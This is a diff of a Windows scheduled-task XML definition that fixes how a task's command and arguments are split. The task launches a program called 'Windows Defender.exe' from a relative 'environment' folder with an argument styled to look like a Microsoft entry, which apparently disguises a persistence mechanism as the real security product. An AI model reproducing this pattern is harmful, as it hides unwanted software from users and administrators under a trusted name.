@@ -38,7 +38,8 @@
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>"environment\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"</Command>
+      <Command>"environment\Windows Defender.exe"</Command>
+        <Arguments>-P"rofile of Windows Defender [Microsoft Corporation]"</Arguments>
     </Exec>
   </Actions>
 </Task>
